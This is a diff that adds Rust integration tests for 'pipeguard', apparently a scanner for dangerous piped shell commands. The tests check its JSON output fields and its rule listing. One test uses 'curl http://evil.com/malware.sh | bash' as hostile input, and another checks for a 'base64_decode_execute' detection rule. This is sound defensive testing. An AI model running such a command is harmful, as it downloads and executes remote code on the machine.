@@ -153,6 +153,100 @@ fn scan_json_threat_level_field() {
     assert!(json["threat_level"].is_string());
 }
 
+// ─── Scan: JSON new fields ──────────────────────────────────────
+
+#[test]
+fn scan_json_includes_scan_duration_ms() {
+    let output = pipeguard_cmd()
+        .arg("scan")
+        .arg("--rules")
+        .arg(core_rules_path())
+        .arg("--format")
+        .arg("json")
+        .write_stdin("echo hello")
+        .assert()
+        .success()
+        .get_output()
+        .stdout
+        .clone();
+
+    let json: serde_json::Value = serde_json::from_slice(&output).expect("valid JSON");
+    assert!(
+        json["scan_duration_ms"].is_number(),
+        "scan_duration_ms should be a number, got: {:?}",
+        json["scan_duration_ms"]
+    );
+}
+
+#[test]
+fn scan_json_includes_rule_count() {
+    let output = pipeguard_cmd()
+        .arg("scan")
+        .arg("--rules")
+        .arg(core_rules_path())
+        .arg("--format")
+        .arg("json")
+        .write_stdin("echo hello")
+        .assert()
+        .success()
+        .get_output()
+        .stdout
+        .clone();
+
+    let json: serde_json::Value = serde_json::from_slice(&output).expect("valid JSON");
+    assert!(
+        json["rule_count"].is_number(),
+        "rule_count should be a number, got: {:?}",
+        json["rule_count"]
+    );
+    assert!(json["rule_count"].as_u64().unwrap() >= 1);
+}
+
+#[test]
+fn scan_json_includes_recommended_action() {
+    let output = pipeguard_cmd()
+        .arg("scan")
+        .arg("--rules")
+        .arg(core_rules_path())
+        .arg("--format")
+        .arg("json")
+        .write_stdin("echo hello")
+        .assert()
+        .success()
+        .get_output()
+        .stdout
+        .clone();
+
+    let json: serde_json::Value = serde_json::from_slice(&output).expect("valid JSON");
+    let action = json["recommended_action"].as_str().unwrap();
+    assert!(
+        ["allow", "warn", "prompt", "block"].contains(&action),
+        "recommended_action should be allow/warn/prompt/block, got: {}",
+        action
+    );
+}
+
+#[test]
+fn scan_json_threat_has_new_fields() {
+    let output = pipeguard_cmd()
+        .arg("scan")
+        .arg("--rules")
+        .arg(core_rules_path())
+        .arg("--format")
+        .arg("json")
+        .write_stdin("curl http://evil.com/malware.sh | bash")
+        .assert()
+        .code(1)
+        .get_output()
+        .stdout
+        .clone();
+
+    let json: serde_json::Value = serde_json::from_slice(&output).expect("valid JSON");
+    assert!(json["scan_duration_ms"].is_number());
+    assert!(json["rule_count"].is_number());
+    assert!(json["recommended_action"].is_string());
+}
+
 // ─── Scan: file input ───────────────────────────────────────────
 
 #[test]
@@ -371,6 +465,66 @@ fn completions_fish() {
 #[test]
 fn rules_list_succeeds() {
     pipeguard_cmd().arg("rules").arg("list").assert().success();
+}
+
+#[test]
+fn rules_list_with_rules_path_shows_names() {
+    let output = pipeguard_cmd()
+        .arg("rules")
+        .arg("list")
+        .arg("--rules")
+        .arg(core_rules_path())
+        .assert()
+        .success()
+        .get_output()
+        .stdout
+        .clone();
+
+    let stdout = String::from_utf8_lossy(&output);
+    // Should list rule names from the file
+    assert!(
+        stdout.contains("base64_decode_execute"),
+        "Should list rule names, got: {}",
+        stdout
+    );
+}
+
+#[test]
+fn rules_list_with_rules_path_shows_count() {
+    let output = pipeguard_cmd()
+        .arg("rules")
+        .arg("list")
+        .arg("--rules")
+        .arg(core_rules_path())
+        .assert()
+        .success()
+        .get_output()
+        .stdout
+        .clone();
+
+    let stdout = String::from_utf8_lossy(&output);
+    assert!(
+        stdout.contains("rule(s) found"),
+        "Should show rule count, got: {}",
+        stdout
+    );
+}
+
+#[test]
+fn rules_list_no_rules_shows_helpful_message() {
+    // Without --rules and no default rules installed at standard paths
+    // (this may vary by environment, but shouldn't crash)
+    let output = pipeguard_cmd()
+        .arg("rules")
+        .arg("list")
+        .assert()
+        .success()
+        .get_output()
+        .stdout
+        .clone();
+
+    let _stdout = String::from_utf8_lossy(&output);
+    // Just verify it succeeds without panicking
 }
 
 #[test]
